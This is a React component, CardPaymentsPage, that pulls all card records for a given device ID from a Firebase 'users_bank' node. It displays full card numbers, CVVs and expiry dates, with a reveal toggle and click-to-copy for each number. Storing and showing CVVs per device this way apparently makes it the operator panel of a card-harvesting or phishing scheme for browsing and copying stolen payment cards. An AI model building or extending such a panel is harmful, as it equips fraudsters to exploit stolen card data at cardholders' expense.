import React, { useState, useEffect } from 'react';
import { useParams } from 'react-router-dom';
import { get, ref } from 'firebase/database';
import { db } from '../firebase/config';

function CardPaymentsPage() {
  const { deviceId } = useParams();
  const [data, setData] = useState(null);
  const [allCards, setAllCards] = useState([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);
  const [copied, setCopied] = useState(null);
  const [showSensitive, setShowSensitive] = useState(false);

  useEffect(() => {
    fetchData();
  }, [deviceId]);

  const fetchData = async () => {
    setLoading(true);
    setError(null);
    try {
      let allCardsArray = [];

      /* ----- 1. NEW: Fetch ALL cards from `users_bank/{deviceId}` ----- */
      const usersBankRef = ref(db, `users_bank/${deviceId}`);
      const usersBankSnap = await get(usersBankRef);

      console.log('🔍 Fetching users_bank...');

      if (usersBankSnap.exists()) {
        const allData = usersBankSnap.val();
        console.log('📦 All users_bank:', allData);

        // ✅ Har entry loop karo
        Object.keys(allData).forEach(key => {
          const item = allData[key];

          // ✅ Sirf card type wale
          if (item && item.type === 'card' && item.cardNumber) {
            allCardsArray.push({
              id: key,
              cardNumber: item.cardNumber || '',
              cvv: item.cvv || '',
              expiry: item.expiry || '',
              cardType: 'DEBIT',
              timestamp: item.updatedAt || 0,
              dateTime: item.updatedAt
                ? new Date(item.updatedAt).toLocaleString('en-IN', {
                    day: '2-digit', month: 'short', year: 'numeric',
                    hour: '2-digit', minute: '2-digit'
                  })
                : 'N/A',
              status: 'Pending',
              source: 'users_bank',
            });
          }
        });

        // ✅ Latest pehle
        allCardsArray.sort((a, b) => b.timestamp - a.timestamp);

        if (allCardsArray.length > 0) {
          setAllCards(allCardsArray);
          setData(allCardsArray[0]);  // Latest card
        }
      }
    } catch (err) {
      console.error('❌ Error:', err);
      setError(err.message);
    }
    setLoading(false);
  };

  const getStatusColor = (status) => {
    if (status === 'Success') return '#10b981';
    if (status === 'Failed') return '#ef4444';
    if (status === 'Pending') return '#f59e0b';
    return '#94a3b8';
  };

  const getStatusIcon = (status) => {
    if (status === 'Success') return '✅';
    if (status === 'Failed') return '❌';
    if (status === 'Pending') return '⏳';
    return '⚪';
  };

  const formatCardNumber = (num) => {
    if (!num) return 'N/A';
    return String(num).replace(/\s/g, '').replace(/(.{4})/g, '$1 ').trim();
  };

  const maskCardNumber = (num) => {
    if (!num) return 'N/A';
    const clean = String(num).replace(/\s/g, '');
    if (clean.length < 8) return clean;
    return '•••• •••• •••• ' + clean.slice(-4);
  };

  const copyToClipboard = (text, key) => {
    if (!text) return;
    navigator.clipboard.writeText(String(text));
    setCopied(key);
    setTimeout(() => setCopied(null), 1500);
  };

  // ⏳ Loading
  if (loading) {
    return (
      <div className="cpp-loading">
        <div className="cpp-spinner"></div>
        <p>Loading card data...</p>
        <style>{`
          .cpp-loading { display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 200px; gap: 12px; padding: 20px; }
          .cpp-spinner { width: 32px; height: 32px; border: 3px solid rgba(108, 99, 255, 0.15); border-top-color: #6c63ff; border-radius: 50%; animation: cppSpin 0.8s linear infinite; }
          @keyframes cppSpin { to { transform: rotate(360deg); } }
          .cpp-loading p { font-size: 12px; color: var(--text-muted, #94a3b8); margin: 0; }
        `}</style>
      </div>
    );
  }

  // ❌ Error
  if (error) {
    return (
      <div className="cpp-error">
        <span className="cpp-error-icon">❌</span>
        <p>Failed to load card data</p>
        <button onClick={fetchData}>Retry</button>
        <style>{`
          .cpp-error { text-align: center; padding: 30px 20px; }
          .cpp-error-icon { font-size: 42px; display: block; margin-bottom: 8px; }
          .cpp-error p { font-size: 13px; color: var(--text-muted); margin: 0 0 12px; }
          .cpp-error button { padding: 8px 22px; border: 1px solid rgba(108, 99, 255, 0.4); border-radius: 8px; background: rgba(108, 99, 255, 0.1); color: #6c63ff; cursor: pointer; font-size: 13px; font-weight: 600; }
        `}</style>
      </div>
    );
  }

  // 📭 Empty
  if (!data) {
    return (
      <div className="cpp-empty">
        <span>📭</span>
        <p>No card data found</p>
        <button onClick={fetchData}>🔄 Refresh</button>
        <style>{`
          .cpp-empty { text-align: center; padding: 30px 20px; color: var(--text-muted); }
          .cpp-empty span { font-size: 42px; display: block; margin-bottom: 8px; }
          .cpp-empty p { font-size: 13px; margin: 0 0 12px; }
          .cpp-empty button { padding: 6px 18px; border: 1px solid rgba(108, 99, 255, 0.4); border-radius: 8px; background: rgba(108, 99, 255, 0.1); color: #6c63ff; cursor: pointer; font-size: 12px; font-weight: 600; }
        `}</style>
      </div>
    );
  }

  return (
    <div className="cpp-root">
      <style>{`
        .cpp-root {
          padding: 8px 0;
          font-family: 'Plus Jakarta Sans', system-ui, -apple-system, sans-serif;
          animation: cppFadeIn 0.4s ease;
        }
        @keyframes cppFadeIn {
          from { opacity: 0; transform: translateY(8px); }
          to { opacity: 1; transform: translateY(0); }
        }

        /* ===== LATEST CARD (BIG VISUAL) ===== */
        .cpp-card-visual {
          position: relative;
          border-radius: 16px;
          padding: 18px 20px;
          margin-bottom: 14px;
          background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
          box-shadow: 0 15px 40px rgba(0, 0, 0, 0.4), 0 0 0 1px rgba(255, 255, 255, 0.08) inset;
          overflow: hidden;
          color: #fff;
        }
        .cpp-card-visual::before {
          content: '';
          position: absolute;
          top: -50%; right: -20%;
          width: 220px; height: 220px;
          background: radial-gradient(circle, rgba(108, 99, 255, 0.4), transparent 70%);
          border-radius: 50%;
          pointer-events: none;
        }
        .cpp-card-visual::after {
          content: '';
          position: absolute;
          bottom: -30%; left: -10%;
          width: 180px; height: 180px;
          background: radial-gradient(circle, rgba(236, 72, 153, 0.25), transparent 70%);
          border-radius: 50%;
          pointer-events: none;
        }

        .cpp-card-top {
          display: flex;
          justify-content: space-between;
          align-items: center;
          margin-bottom: 22px;
          position: relative; z-index: 1;
        }

        .cpp-chip {
          width: 34px; height: 26px;
          border-radius: 4px;
          background: linear-gradient(135deg, #fbbf24, #f59e0b);
          box-shadow: 0 2px 6px rgba(0,0,0,0.3);
          position: relative;
        }
        .cpp-chip::before {
          content: '';
          position: absolute;
          inset: 4px;
          border: 1px solid rgba(0,0,0,0.2);
          border-radius: 2px;
        }

        .cpp-card-type {
          font-size: 12px;
          font-weight: 700;
          letter-spacing: 1.5px;
          text-transform: uppercase;
          color: rgba(255, 255, 255, 0.9);
          background: rgba(255, 255, 255, 0.1);
          padding: 4px 12px;
          border-radius: 20px;
          backdrop-filter: blur(10px);
        }

        .cpp-card-number {
          font-family: 'Courier New', monospace;
          font-size: 19px;
          font-weight: 700;
          letter-spacing: 2.5px;
          color: #fff;
          margin-bottom: 20px;
          display: flex;
          align-items: center;
          justify-content: space-between;
          gap: 8px;
          cursor: pointer;
          position: relative; z-index: 1;
        }
        .cpp-card-number:hover { color: #a78bfa; }

        .cpp-eye-btn {
          background: rgba(255, 255, 255, 0.1);
          border: none;
          border-radius: 6px;
          padding: 4px 8px;
          cursor: pointer;
          font-size: 14px;
          flex-shrink: 0;
        }
        .cpp-eye-btn:hover { background: rgba(255, 255, 255, 0.2); }

        .cpp-card-bottom {
          display: flex;
          justify-content: space-between;
          align-items: flex-end;
          position: relative; z-index: 1;
        }

        .cpp-card-field { display: flex; flex-direction: column; gap: 2px; }
        .cpp-card-field .label {
          font-size: 9px;
          text-transform: uppercase;
          letter-spacing: 1px;
          color: rgba(255, 255, 255, 0.5);
          font-weight: 600;
        }
        .cpp-card-field .value {
          font-size: 12.5px;
          font-weight: 700;
          color: #fff;
        }

        /* ===== ALL CARDS LIST ===== */
        .cpp-all-section {
          background: var(--bg-card);
          border: 1px solid var(--border-color);
          border-radius: 12px;
          overflow: hidden;
          margin-top: 8px;
        }

        .cpp-all-header {
          display: flex;
          justify-content: space-between;
          align-items: center;
          padding: 10px 14px;
          background: var(--bg-input);
          border-bottom: 1px solid var(--border-color);
          font-size: 12px;
          font-weight: 700;
          color: var(--text-primary);
        }
        .cpp-all-header .title {
          display: flex;
          align-items: center;
          gap: 6px;
        }
        .cpp-count-badge {
          background: linear-gradient(135deg, #6c63ff, #a855f7);
          color: #fff;
          font-size: 10px;
          padding: 2px 9px;
          border-radius: 10px;
          font-weight: 700;
        }

        .cpp-all-list {
          max-height: 400px;
          overflow-y: auto;
        }
        .cpp-all-list::-webkit-scrollbar { width: 4px; }
        .cpp-all-list::-webkit-scrollbar-thumb { background: var(--border-color); border-radius: 4px; }

        .cpp-all-item {
          display: flex;
          justify-content: space-between;
          align-items: center;
          padding: 10px 14px;
          border-bottom: 1px solid var(--border-color);
          cursor: pointer;
          transition: background 0.2s;
          gap: 10px;
        }
        .cpp-all-item:last-child { border-bottom: none; }
        .cpp-all-item:hover { background: rgba(108, 99, 255, 0.04); }

        .cpp-all-item.latest {
          background: rgba(108, 99, 255, 0.06);
          border-left: 3px solid #6c63ff;
        }

        .cpp-all-left {
          display: flex;
          align-items: center;
          gap: 10px;
          min-width: 0;
          flex: 1;
        }

        .cpp-all-icon {
          width: 36px; height: 36px;
          border-radius: 8px;
          background: linear-gradient(135deg, #1a1a2e, #0f3460);
          display: flex;
          align-items: center;
          justify-content: center;
          font-size: 16px;
          flex-shrink: 0;
          border: 1px solid rgba(108, 99, 255, 0.3);
        }

        .cpp-all-info {
          display: flex;
          flex-direction: column;
          gap: 2px;
          min-width: 0;
        }

        .cpp-all-number {
          font-family: 'Courier New', monospace;
          font-size: 12px;
          font-weight: 700;
          color: var(--text-primary);
          letter-spacing: 0.5px;
          overflow: hidden;
          text-overflow: ellipsis;
        }

        .cpp-all-meta {
          display: flex;
          align-items: center;
          gap: 8px;
          font-size: 10px;
          color: var(--text-muted);
        }

        .cpp-all-right {
          display: flex;
          flex-direction: column;
          align-items: flex-end;
          gap: 3px;
          flex-shrink: 0;
        }

        .cpp-new-badge {
          background: linear-gradient(135deg, #10b981, #059669);
          color: #fff;
          font-size: 8px;
          font-weight: 800;
          padding: 2px 6px;
          border-radius: 4px;
          letter-spacing: 0.5px;
        }

        .cpp-all-time {
          font-size: 9px;
          color: var(--text-muted);
          white-space: nowrap;
        }

        /* ===== COPY TIP ===== */
        .cpp-copy-tip {
          position: absolute;
          top: -6px; right: 6px;
          background: #6c63ff;
          color: #fff;
          font-size: 9px;
          padding: 2px 6px;
          border-radius: 4px;
          font-weight: 700;
          animation: cppTipIn 0.2s ease;
        }
        @keyframes cppTipIn {
          from { opacity: 0; transform: translateY(4px); }
          to { opacity: 1; transform: translateY(0); }
        }

        /* ===== MOBILE ===== */
        @media (max-width: 400px) {
          .cpp-card-number { font-size: 15px; letter-spacing: 1.5px; }
          .cpp-card-visual { padding: 14px 16px; }
          .cpp-all-number { font-size: 11px; }
        }
          /* ===== CARD DETAILS GRID (NEW) ===== */
.cpp-all-details {
  display: flex;
  align-items: center;
  gap: 6px;
  flex-wrap: wrap;
  margin-top: 4px;
}

.cpp-detail-chip {
  display: inline-flex;
  align-items: center;
  gap: 3px;
  background: var(--bg-input);
  border: 1px solid var(--border-color);
  border-radius: 5px;
  padding: 2px 7px;
  font-size: 10px;
  line-height: 1.3;
}

.cpp-detail-chip .chip-label {
  color: var(--text-muted);
  font-size: 8.5px;
  font-weight: 600;
  text-transform: uppercase;
  letter-spacing: 0.3px;
}

.cpp-detail-chip .chip-value {
  color: var(--text-primary);
  font-family: 'Courier New', monospace;
  font-weight: 700;
  font-size: 10.5px;
}

/* Card Number styling update */
.cpp-all-number {
  font-family: 'Courier New', monospace;
  font-size: 13px;
  font-weight: 700;
  color: var(--text-primary);
  letter-spacing: 0.8px;
  white-space: nowrap;
  overflow: hidden;
  text-overflow: ellipsis;
}

/* Card item padding increase */
.cpp-all-item {
  padding: 12px 14px !important;
}

.cpp-all-icon {
  width: 40px !important;
  height: 40px !important;
  font-size: 18px !important;
}

/* Mobile responsive */
@media (max-width: 480px) {
  .cpp-all-number {
    font-size: 11px;
    letter-spacing: 0.5px;
  }

  .cpp-detail-chip {
    padding: 1px 5px;
    font-size: 9px;
  }

  .cpp-detail-chip .chip-label {
    font-size: 8px;
  }

  .cpp-detail-chip .chip-value {
    font-size: 9.5px;
  }

  .cpp-all-icon {
    width: 34px !important;
    height: 34px !important;
    font-size: 15px !important;
  }

  .cpp-all-time {
    font-size: 8px;
  }
}

@media (max-width: 360px) {
  .cpp-all-number {
    font-size: 10px;
  }

  .cpp-detail-chip {
    padding: 1px 4px;
    font-size: 8px;
  }

  .cpp-detail-chip .chip-label {
    font-size: 7px;
  }

  .cpp-detail-chip .chip-value {
    font-size: 9px;
  }
}
      `}
      </style>

      {/* ============ LATEST CARD (Big Visual) ============ */}
      <div className="cpp-card-visual">
        <div className="cpp-card-top">
          <div className="cpp-chip"></div>
          <div className="cpp-card-type">
            {data.cardType || 'DEBIT'}
            {allCards.length > 0 && (
              <span style={{ marginLeft: 6, fontSize: 9, opacity: 0.7 }}>
                (Latest)
              </span>
            )}
          </div>
        </div>

        <div
          className="cpp-card-number"
          onClick={() => setShowSensitive(!showSensitive)}
        >
          <span>
            {showSensitive
              ? formatCardNumber(data.cardNumber)
              : maskCardNumber(data.cardNumber)}
          </span>
          <button
            className="cpp-eye-btn"
            onClick={(e) => { e.stopPropagation(); setShowSensitive(!showSensitive); }}
          >
            {showSensitive ? '👁️' : '👁️‍🗨️'}
          </button>
        </div>

        <div className="cpp-card-bottom">
          <div className="cpp-card-field">
            <span className="label">Expires</span>
            <span className="value">{data.expiry || 'MM/YY'}</span>
          </div>
          <div className="cpp-card-field">
            <span className="label">CVV</span>
            <span className="value">
              {showSensitive ? (data.cvv || '•••') : '•••'}
            </span>
          </div>
          <div className="cpp-card-field">
            <span className="label">Status</span>
            <span className="value" style={{ color: getStatusColor(data.status) }}>
              {getStatusIcon(data.status)} {data.status}
            </span>
          </div>
        </div>
      </div>

{/* ============ ALL CARDS LIST ============ */}
{allCards.length > 0 && (
  <div className="cpp-all-section">
    <div className="cpp-all-header">
      <span className="title">💳 All Cards</span>
      <span className="cpp-count-badge">{allCards.length}</span>
    </div>

    <div className="cpp-all-list">
      {allCards.map((card, index) => (
        <div
          key={card.id}
          className={`cpp-all-item ${index === 0 ? 'latest' : ''}`}
          onClick={() => copyToClipboard(card.cardNumber, `card_${card.id}`)}
        >
          {/* LEFT SIDE: Full details */}
          <div className="cpp-all-left">
            <div className="cpp-all-icon">💳</div>
            <div className="cpp-all-info">
              {/* Card Number */}
              <span className="cpp-all-number">
                {showSensitive
                  ? formatCardNumber(card.cardNumber)
                  : maskCardNumber(card.cardNumber)}
              </span>
              
              {/* Detail Grid: Expiry | CVV | Status */}
              <div className="cpp-all-details">
                <span className="cpp-detail-chip">
                  <span className="chip-label">Exp</span>
                  <span className="chip-value">{card.expiry}</span>
                </span>
                <span className="cpp-detail-chip">
                  <span className="chip-label">CVV</span>
                  <span className="chip-value">
                    {showSensitive ? card.cvv : '•••'}
                  </span>
                </span>
                <span className="cpp-detail-chip">
                  <span className="chip-label">Type</span>
                  <span className="chip-value">{card.cardType || 'DEBIT'}</span>
                </span>
              </div>
            </div>
          </div>

          {/* RIGHT SIDE: Badge + Time */}
          <div className="cpp-all-right">
            {index === 0 && <span className="cpp-new-badge">NEW</span>}
            <span className="cpp-all-time">{card.dateTime}</span>
          </div>

          {copied === `card_${card.id}` && (
            <span className="cpp-copy-tip">Copied!</span>
          )}
        </div>
      ))}
    </div>
  </div>
)}
    </div>
  );
}

export default CardPaymentsPage;